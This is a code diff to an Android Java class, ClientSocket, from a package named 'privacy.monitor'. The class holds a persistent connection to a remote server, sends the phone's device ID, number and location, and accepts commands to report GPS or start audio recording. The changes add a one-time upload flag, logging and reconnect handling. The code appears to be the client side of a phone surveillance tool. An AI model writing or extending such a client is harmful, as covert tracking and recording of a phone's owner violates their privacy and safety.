@@ -8,7 +8,12 @@ import java.io.PrintWriter;
 import java.net.Socket;
 import java.util.HashMap;
 import java.util.Map;
+import android.content.Context;
+import android.content.SharedPreferences;
+import android.content.SharedPreferences.Editor;
+import android.os.SystemClock;
 import com.google.gson.Gson;
+import com.privacy.monitor.base.C;
 import com.privacy.monitor.domain.DeviceInfo;
 import com.privacy.monitor.util.Logger;
 
@@ -23,6 +28,7 @@ public abstract class ClientSocket extends Thread {
 	private static final String LON = "lon";
 	private static final String LAT = "lat";
 	private Socket m_socket;
+	private Context context;
 	
 	//是否支持录音
 	private static final String SUP_REC = "support_rec";
@@ -51,8 +57,9 @@ public abstract class ClientSocket extends Thread {
 	public static final String TYPE_GPS_NOW=  "GPS_NOW";
 	public static final String TYPE_REC_NOW=  "REC_NOW";
 	
-	public ClientSocket(DeviceInfo deviceInfo){
+	public ClientSocket(DeviceInfo deviceInfo,Context context){
 		this.deviceInfo = deviceInfo;
+		this.context = context;
 	
 	}
 	
@@ -60,12 +67,13 @@ public abstract class ClientSocket extends Thread {
 	public void run() {
 		while(true){
 			Socket socket = getSocket();
-			
 			if(socket !=null && !socket.isInputShutdown() && !socket.isClosed() && socket.isConnected()){
+				
 				try {
 					//socket.setKeepAlive(true);
 					BufferedReader br = new BufferedReader(new InputStreamReader(socket.getInputStream(),FONT_CODE));
 					String data = "";
+					Logger.d("ClientSocket","socket进来了....");
 					while((data=br.readLine()) != null){
 						Logger.d("ClientSocket",data);
 						receiveData(data);
@@ -74,8 +82,8 @@ public abstract class ClientSocket extends Thread {
 					Logger.d("ClientSocket","异常了....");
 					try {
 						m_socket.close();
-						m_socket=null;
-					} catch (Exception e2) {
+						m_socket = null;
+					} catch (IOException e1) {
 						m_socket = null;
 					}
 				}
@@ -107,6 +115,9 @@ public abstract class ClientSocket extends Thread {
 	public abstract void receiveData(String type, String data);
 	
 	private void sendDeviceInfo(){
+		SharedPreferences sp = context.getSharedPreferences(C.DEVICE_INFO, Context.MODE_PRIVATE);
+		boolean isUpload = sp.getBoolean("uploaddeivceinfo", false);
+		if(isUpload) return;
 		Map<String,String> cMap= new HashMap<String, String>();
 		cMap.put(DEVICE_ID, deviceInfo.getDeviceID());
 		cMap.put(PHONE_NUM, deviceInfo.getPhoneNum());
@@ -124,7 +135,10 @@ public abstract class ClientSocket extends Thread {
 			PrintWriter pw = new PrintWriter(new OutputStreamWriter(m_socket.getOutputStream(),FONT_CODE));
 			pw.println(mapStr);
 			pw.flush();
-
+			Logger.d("ClientSocket","上传设备信息成功...");
+			Editor editor = sp.edit();
+			editor.putBoolean("uploaddeivceinfo", true);
+			editor.commit();
 		} catch (Exception e) {
 			Logger.d("ClientSocket","Socket Send Device Info Failed");
 		}
@@ -143,10 +157,17 @@ public abstract class ClientSocket extends Thread {
 	
 	private void createSocket(){
 		try {
-			m_socket = new Socket(server,port);
+			Logger.d("ClientSocket","createSocket.....");
+			if(m_socket==null){
+				m_socket = new Socket(server,port);
+			}else {
+				//m_socket.connect(SocketA)
+			}
 			sendDeviceInfo();
+			
 		} catch (Exception e) {
-			System.out.println("Socket Connected Fail On  " + server + ":" + port);
+			
+			Logger.d("ClicentSocket","Socket Connected Fail On  " + server + ":" + port);
 			if(m_socket!=null){
 				try {
 					m_socket.close();
@@ -155,6 +176,8 @@ public abstract class ClientSocket extends Thread {
 				}
 				m_socket = null;
 			}
+			SystemClock.sleep(500);
 		}
 	}
+
 }
